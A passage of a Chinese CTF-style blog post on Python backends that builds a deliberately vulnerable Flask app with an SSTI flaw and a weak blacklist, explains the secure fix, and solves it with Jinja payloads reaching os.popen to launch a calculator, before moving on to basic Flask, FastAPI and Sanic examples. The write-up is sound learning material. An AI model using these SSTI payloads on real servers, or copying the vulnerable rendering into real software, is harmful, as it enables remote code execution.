@@ -1,0 +1,1380 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="学习 Flask、FastApi、Sanic 模板的相关知识">
+<title>御林招新题：python 后端</title>
+
+<link rel='canonical' href='https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-python%E5%90%8E%E7%AB%AF/'>
+
+<link rel="stylesheet" href="/scss/style.min.b13448cb6a9f11e8e6aeb548ed55eed4ad65121ff58a1b734bc897438af28d62.css"><meta property='og:title' content="御林招新题：python 后端">
+<meta property='og:description' content="学习 Flask、FastApi、Sanic 模板的相关知识">
+<meta property='og:url' content='https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-python%E5%90%8E%E7%AB%AF/'>
+<meta property='og:site_name' content='Calendar&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='CTF' /><meta property='article:published_time' content='2025-10-20T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-10-20T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="御林招新题：python 后端">
+<meta name="twitter:description" content="学习 Flask、FastApi、Sanic 模板的相关知识"><link rel="alternate" type="application/json" href="https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-python%E5%90%8E%E7%AB%AF/index.json">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/images/1_hu_b5fde55a1ef6fadd.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Calendar&#39;s Blog</a></h1>
+            <h2 class="site-description">欢迎</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/calendar0917'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#707070"
+     stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+     class="icon icon-tabler icons-tabler-outline icon-tabler-square-rounded-arrow-up">
+    <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+    <path d="M16 12l-4 -4l-4 4"/>
+    <path d="M12 16v-8"/>
+    <path d="M12 3c7.2 0 9 1.8 9 9s-1.8 9 -9 9s-9 -1.8 -9 -9s1.8 -9 9 -9z"/>
+</svg>
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#flask"><strong>Flask</strong></a>
+      <ol>
+        <li><a href="#flask-的基础知识">Flask 的基础知识</a></li>
+      </ol>
+    </li>
+    <li><a href="#fastapi-和-sanic-基础"><strong>FastAPI 和 Sanic 基础</strong></a></li>
+    <li><a href="#异步编程实践"><strong>异步编程实践</strong></a></li>
+    <li><a href="#项目结构与蓝图apirouter"><strong>项目结构与蓝图（APIRouter）</strong></a></li>
+    <li><a href="#中间件与生命周期管理"><strong>中间件与生命周期管理</strong></a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" style="background-color: #3654aa; color: #fff;">
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/posts/%E5%BE%A1%E6%9E%97-python%E5%90%8E%E7%AB%AF/">御林招新题：python 后端</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            学习 Flask、FastApi、Sanic 模板的相关知识
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 20, 2025</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="flask"><strong>Flask</strong>
+</h2><ul>
+<li><strong>创建应用</strong>：创建一个简单的 Flask 应用，包含一个首页 (<code>/</code>) 和一个带参数的路由 (<code>/hello/&lt;name&gt;</code>)，返回个性化的问候语。</li>
+<li><strong>实现服务器端模板注入（SSTI）</strong>：自己设置黑名单，自己渲染输入的name，设一个SSTI的漏洞</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">request</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 黑名单，设置得简单了一些</span>
+</span></span><span class="line"><span class="cl"><span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;{{&#34;</span><span class="p">,</span> <span class="s2">&#34;}}&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;欢迎！&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/hello/&lt;name&gt;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hello</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 故意使用不安全的模板渲染，存在 SSTI 漏洞</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;输入包含非法内容！&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 渲染输入</span>
+</span></span><span class="line"><span class="cl">    <span class="n">template</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;Hello, </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">!&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<ul>
+<li>
+<p>漏洞成因：</p>
+<ul>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">template</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;Hello, </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">!&#34;</span>  <span class="c1"># 将用户输入的 name 直接拼接到模板中</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>  <span class="c1"># 渲染包含用户输入的模板</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>在引擎渲染 template 的时候，会执行其中的恶意代码</p>
+</li>
+</ul>
+</li>
+<li>
+<p>安全写法：</p>
+<ul>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 将 name 作为变量传入模板，这样只会当成字符串处理</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;hello.html&#39;</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">name</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<ul>
+<li>
+<p><strong>完成题目</strong>：把自己出的题，打出来（）</p>
+<blockquote>
+<p>相信做出来之后，一定会对Basic的SSTI靶场有更深的理解</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251020211032658.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251020211032658"
+	
+	
+></p>
+<p><code>{%print(''.__class__.__base__.__subclasses__())%}</code>，找可用的函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="bp">cls</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="nb">object</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;os.&#39;</span> <span class="ow">in</span> <span class="bp">cls</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;index: </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">, class: </span><span class="si">{</span><span class="bp">cls</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>{% print(''.__class__.__base__.__subclasses__()[n].__init__.__globals__.os.popen('calc').read()) %}</code>，弹了计算器</p>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251020214004864.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251020214004864"
+	
+	
+></p>
+</li>
+</ul>
+<h3 id="flask-的基础知识">Flask 的基础知识
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login/&lt;name&gt;&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span><span class="c1"># 指定路由、请求方式，用 request.method() 获取</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">   
+</span></span><span class="line"><span class="cl">    <span class="c1"># 获取参数的方法，需要借助 request 模块</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>  <span class="c1"># 获取表单</span>
+</span></span><span class="line"><span class="cl">    <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;query&#39;</span><span class="p">)</span><span class="c1"># ?参数</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">name</span> <span class="c1"># 路径参数,可以直接使用</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 响应</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="s1">&#39;自定义响应&#39;</span><span class="p">,</span> <span class="mi">201</span><span class="p">)</span>  <span class="c1"># 状态码 201（创建成功）</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;...&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;...&#39;</span>  <span class="c1"># 添加响应头</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;profile.html&#39;</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">username</span><span class="p">,</span> <span class="n">age</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span> <span class="c1"># 模板渲染后返回</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1"># 会话技术</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="s1">&#39;...&#39;</span> <span class="c1"># 设置密钥</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">username</span> <span class="o">==</span> <span class="s1">&#39;admin&#39;</span><span class="p">:</span>	<span class="c1"># 验证用户名密码（实际需查询数据库）</span>
+</span></span><span class="line"><span class="cl">        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>  <span class="c1"># 存储会话数据</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;dashboard&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;登录失败&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 模板语法 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 填充字段、条件判断 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>欢迎，{{ name }}！<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>  <span class="c">&lt;!-- 变量替换 --&gt;</span>
+</span></span><span class="line"><span class="cl">{% if age &gt;= 18 %}  <span class="c">&lt;!-- 条件判断 --&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>成年<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">{% else %}
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>未成年<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">{% endif %}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 循环遍历列表 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    {% for hobby in [&#39;读书&#39;, &#39;运动&#39;] %}
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>{{ hobby }}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    {% endfor %}
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="fastapi-和-sanic-基础"><strong>FastAPI 和 Sanic 基础</strong>
+</h2><ul>
+<li><strong>创建应用</strong>：分别为 FastAPI 和 Sanic 创建两个独立的应用。</li>
+<li><strong>路由与参数</strong>：每个应用都应包含一个简单的路由 (<code>/</code>) 和一个带参数的路由 (<code>/items/{item_id}</code>)，并分别处理 GET 和 POST 请求。</li>
+<li><strong>数据校验</strong>：在 FastAPI 应用中，使用 <strong>Pydantic 模型</strong>对 POST 请求的数据进行自动校验。</li>
+</ul>
+<p>FastAPI:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">fastapi</span> <span class="kn">import</span> <span class="n">FastAPI</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pydantic</span> <span class="kn">import</span> <span class="n">BaseModel</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 创建 FastAPI 应用实例</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">FastAPI</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义 Pydantic 模型，用于 POST 请求数据校验</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Item</span><span class="p">(</span><span class="n">BaseModel</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span><span class="p">:</span> <span class="nb">str</span>
+</span></span><span class="line"><span class="cl">    <span class="n">price</span><span class="p">:</span> <span class="nb">float</span>
+</span></span><span class="line"><span class="cl">    <span class="n">is_offer</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">None</span>  <span class="c1"># 可选字段，默认值为 None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.get</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span> <span class="c1"># 简单路由</span>
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">read_root</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;你好&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.post</span><span class="p">(</span><span class="s2">&#34;/items/</span><span class="si">{item_id}</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># POST 请求，使用 Pydantic 模型校验数据</span>
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">create_item</span><span class="p">(</span><span class="n">item_id</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">item</span><span class="p">:</span> <span class="n">Item</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># item 会自动根据 Item 模型校验请求体数据</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;item_id&#34;</span><span class="p">:</span> <span class="n">item_id</span><span class="p">,</span> <span class="o">**</span><span class="n">item</span><span class="o">.</span><span class="n">dict</span><span class="p">()}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Sanic：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sanic</span> <span class="kn">import</span> <span class="n">Sanic</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sanic.response</span> <span class="kn">import</span> <span class="n">json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 创建 Sanic 应用实例</span>
